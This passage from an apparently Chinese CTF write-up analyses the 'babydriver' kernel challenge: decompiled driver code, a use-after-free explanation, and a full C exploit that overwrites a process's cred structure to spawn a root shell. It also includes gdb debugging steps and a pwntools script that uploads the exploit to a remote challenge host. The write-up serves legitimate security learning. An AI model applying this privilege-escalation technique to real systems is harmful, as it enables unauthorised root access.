function">class_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">// 输出内核信息日志，表示设备类创建失败</span>        <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_33B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// 从内核中删除字符设备</span>      <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">// 输出内核信息日志，表示添加字符设备失败</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_327<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 注销之前分配的字符设备号</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 输出内核信息日志，表示分配字符设备的主设备号失败</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_309<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数用于进行初始化来设置参数，分配字符设备的主设备号<code>babydev_no</code>，使用分配的主设备号添加字符设备<code>cdev_0</code>，创建名称为 <code>babydev</code>的设备类并与主设备号相关联，**<code>/dev</code>**目录下创建一个名称为<code>babydev</code>的设备节点并将其与设备类和主设备号相关联，以上全部成功则<code>return 0</code>，否则销毁前面步骤的结果并输出错误信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">babydriver_exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 销毁设备节点</span>  <span class="token function">device_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">,</span> babydev_no<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 销毁设备类</span>  <span class="token function">class_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 从内核中删除字符设备</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注销之前分配的字符设备号</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数主要就是在退出时收回<code>init</code>时创建的设备</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 分配内核缓冲区内存</span>  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置内核缓冲区长度</span>  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>  <span class="token comment">// 输出设备打开信息</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babyread</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出文件读取信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区为空，则返回错误码</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区长度大于指定长度</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 将数据从内核缓冲区复制到用户缓冲区</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babywrite</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出文件写入信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区为空，则返回错误码</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区长度大于指定长度</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 将数据从用户缓冲区复制到内核缓冲区</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和正常<code>orw</code>感觉差不多，<code>open</code>对<code>babydev_struct</code>分配内存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyrelease</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 输出设备释放信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 释放设备缓冲区</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device release\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类似<code>free</code>，对<code>babydev_struct</code>释放内存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">babyioctl</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出ioctl操作信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token comment">// 如果命令为0x10001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">0x10001</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 释放原有的设备缓冲区</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 重新分配设备缓冲区</span>    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置设备缓冲区长度</span>    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token comment">// 输出分配完成信息</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 输出未知命令信息</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2EB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>ioctl</code> 函数是用于进行设备 I&#x2F;O 控制的系统调用，它允许用户空间程序与设备驱动程序进行通信，以控制设备的各种操作</p><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cCopy code<span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> request<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参数解释：</p><ul><li><code>fd</code>：文件描述符，用于标识要进行 I&#x2F;O 控制的设备。</li><li><code>request</code>：无符号长整型参数，用于指定要执行的操作或控制命令。</li><li><code>...</code>：可选参数，用于传递与 <code>request</code> 相关的数据或结构体。参数类型和数量取决于所执行的具体操作。</li></ul><p>参数详解：</p><ul><li><code>fd</code>：文件描述符通常是通过文件打开操作（例如 <code>open</code> 函数）获得的，用于标识要进行 <code>I/O</code> 控制的设备。</li><li><code>request</code>：这是一个无符号长整型参数，通常是一个设备特定的控制命令或操作码。<code>ioctl</code> 函数的具体行为由 <code>request</code> 参数确定，每个设备驱动程序都会定义一组支持的 <code>request</code> 值，以便用户程序能够控制设备的各种操作。</li><li><code>...</code>：这是一个可选的参数列表，用于传递与 <code>request</code> 相关的数据或结构体。具体的参数类型和数量取决于所执行的具体操作。例如，如果 <code>request</code> 是用于设置设备参数的命令，则后续参数可能是一个指向包含新参数值的结构体的指针。</li></ul><p>返回值：</p><ul><li><code>ioctl</code> 函数执行成功时返回 0，否则返回 -1，并设置 <code>errno</code> 表示错误类型。</li></ul></blockquote><p>题目中的该函数三个参数分别是文件描述符、操作码、缓冲区长度</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>漏洞点出在<code>uaf</code>，即释放之后没有清零，具体利用暂且不谈，本篇仅学习<code>kernel pwn</code>的一般过程，以下是<code>exp</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">,</span>id<span class="token punctuation">;</span>    <span class="token keyword">char</span> cred<span class="token punctuation">[</span><span class="token number">0xa8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>    id <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>cred<span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]welcome root:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]fork fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在解压的文件系统中写入<code>exp</code>的<code>c</code>程序并且<strong>静态编译</strong>（<code>kernel</code> 不提供标准库）再打包，再次启动就有了<code>exp</code>,执行之后就可以提权了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> flagcat: can<span class="token string">'t open '</span>flag': Permission denied/ $ ./exp<span class="token punctuation">[</span>   <span class="token number">10.489723</span><span class="token punctuation">]</span> device <span class="token function">open</span><span class="token punctuation">[</span>   <span class="token number">10.492086</span><span class="token punctuation">]</span> device <span class="token function">open</span><span class="token punctuation">[</span>   <span class="token number">10.492300</span><span class="token punctuation">]</span> alloc <span class="token keyword">done</span><span class="token punctuation">[</span>   <span class="token number">10.493707</span><span class="token punctuation">]</span> device release<span class="token punctuation">[</span>*<span class="token punctuation">]</span>welcome root:/ <span class="token comment"># cat flag</span>flag<span class="token punctuation">&#123;</span>test<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装<code>vmlinux-to-elf</code>来得到有调试符号的<code>bzImage</code>（<code>python3&gt;3.5</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> lz4 git+https://github.com/marin-m/vmlinux-to-elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vmlinux-to-elf bzImage vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  vmlinux-to-elf bzImage vmlinux<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Kernel successfully decompressed in-memory <span class="token punctuation">(</span>the offsets that follow will be given relative to the decompressed binary<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Version string: Linux version <span class="token number">4.4</span>.72 <span class="token punctuation">(</span>atum@ubuntu<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version <span class="token number">5.4</span>.0 <span class="token number">20160609</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">5.4</span>.0-6ubuntu1~16.04.4<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Guessed architecture: x86_64 successfully <span class="token keyword">in</span> <span class="token number">2.60</span> seconds<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_token_table at <span class="token function">file</span> offset 0x00eafe70<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_token_index at <span class="token function">file</span> offset 0x00eb0210<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_markers at <span class="token function">file</span> offset 0x00eaf318<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_names at <span class="token function">file</span> offset 0x00d99480<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_num_syms at <span class="token function">file</span> offset 0x00d99478<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Null addresses overall: <span class="token number">0.00215239</span> %<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found kallsyms_addresses at <span class="token function">file</span> offset 0x00ce3cb8<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully wrote the new ELF kernel to vmlinux⚡  <span class="token function">ls</span>boot.sh  bzImage  disk.flag.img  File_system  rootfs.cpio  vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>gdb</code>调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span><span class="token builtin class-name">set</span> architecture i386:x86-64add-symbol-file vmlinux./boot.shc<span class="token comment"># 先 continue， 在 insmod 之后手动 Ctrl+C 再设置断点，免得断点处于 pending 状态</span>add-symbol-file babydriver.ko 0xffffffffc0000000<span class="token comment">#kernel shell中lsmod</span>b babyreadb babywriteb babyioctlb babyopenb babyreleasec./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="远程攻击"><a href="#远程攻击" class="headerlink" title="远程攻击"></a>远程攻击</h2><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> string context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">send_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'$ '</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lg <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">'Upload'</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    encoded <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lg<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string">'%d / %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        send_cmd<span class="token punctuation">(</span><span class="token string">'echo -n "%s" >> benc'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>encoded<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    send_cmd<span class="token punctuation">(</span><span class="token string">'cat benc | base64 -d > bout'</span><span class="token punctuation">)</span>    send_cmd<span class="token punctuation">(</span><span class="token string">'chmod +x bout'</span><span class="token punctuation">)</span>    lg<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token punctuation">)</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'musl-gcc -w -s -static -o3 exp.c -o exp'</span><span class="token punctuation">)</span>upload<span class="token punctuation">(</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="终端设备类型简介"><a href="#终端设备类型简介" class="headerlink" title="终端设备类型简介"></a>终端设备类型简介</h2><p>在 <code>Linux</code> 中 <code>/dev</code> 目录下，终端设备文件通常有以下几种(不同版本<code>linux</code>中不一定都存在)：</p><h3 id="x2F-dev-x2F-ttySn-串行端口终端"><a href="#x2F-dev-x2F-ttySn-串行端口终端" class="headerlink" title="&#x2F;dev&#x2F;ttySn-串行端口终端"></a>&#x2F;dev&#x2F;ttySn-串行端口终端</h3><p>用于与串行端口连接的终端设备，类似于 <code>Windows</code> 下的 <code>COM</code></p><h3 id="x2F-dev-x2F-tty-控制终端"><a href="#x2F-dev-x2F-tty-控制终端" class="headerlink" 